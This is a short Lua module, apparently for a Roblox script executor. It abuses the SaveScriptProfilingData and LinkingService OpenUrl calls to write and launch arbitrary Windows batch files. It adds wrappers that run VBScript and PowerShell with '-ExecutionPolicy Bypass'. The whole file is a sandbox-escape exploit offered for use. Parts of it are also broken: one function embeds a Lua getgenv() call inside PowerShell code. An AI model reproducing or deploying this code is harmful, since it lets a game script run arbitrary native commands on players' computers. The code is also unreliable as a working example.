local secment = {}

function secment.bat(code)
    local name = math.random(100000, 999999)
    local batContent = [[
@echo off
]] .. code .. [[
]]
    local batFileName = tostring(name) .. ".bat"
    game:GetService("LinkingService"):OpenUrl(game:GetService("ScriptContext"):SaveScriptProfilingData(batContent, batFileName))
end

function secment.vbs(code)
    secment.bat([[ 
@echo off
setlocal

(
echo ]] .. code .. [[
) > temp_script.vbs

cscript //nologo temp_script.vbs
del temp_script.vbs
]])
end

function secment.powershell(code)
    secment.bat([[Powershell.exe -ExecutionPolicy Bypass -Command "]] .. code .. [[" & del temp_script.ps1]])
end

function secment.msgbox(message)
    secment.powershell([[Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(']] .. message .. [[')]])
end

function secment.gui(title, inputText, callback)
    local guiCode = [[
Add-Type -AssemblyName System.Windows.Forms
$input = [System.Windows.Forms.MessageBox]::Show("]] .. inputText .. [[", "]] .. title .. [[", [System.Windows.Forms.MessageBoxButtons]::OKCancel)

if ($input -eq [System.Windows.Forms.DialogResult]::OK) {
    getgenv().]] .. callback .. [[
}
]]
    secment.powershell(guiCode)
end

function secment.help()
    print("Available Functions:")
    print("1. secment.bat(code) - Creates and runs a batch script.")
    print("2. secment.vbs(code) - Creates and runs a VBS script.")
    print("3. secment.powershell(code) - Executes a PowerShell command.")
    print("4. secment.msgbox(message) - Shows a message box using PowerShell.")
    print("5. secment.gui(title, inputText, callback) - Creates a GUI prompt with input text.")
    print("6. secment.help() - Prints this help message.")
end

return secment
